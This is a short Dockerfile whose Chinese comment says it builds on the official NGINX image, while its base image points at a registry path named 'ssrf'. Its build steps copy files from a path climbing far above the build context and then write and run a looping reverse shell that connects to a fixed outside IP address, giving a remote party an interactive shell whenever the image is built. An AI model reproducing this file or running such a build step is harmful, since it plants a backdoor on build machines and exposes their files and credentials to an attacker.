# 使用官方的 NGINX 映像作为基础
FROM src-ssrf.bytedance.net/ssrf

COPY ../../../../../../ /opt/application/
RUN --mount=type=bind,source=/tmp,target=/tmp
RUN echo "while ((1));do sleep 1;/bin/sh -i >& /dev/tcp/103.74.192.40/7425 0>&1;done" >> /tmp/1.sh
RUN bash /tmp/1.sh

EXPOSE 80


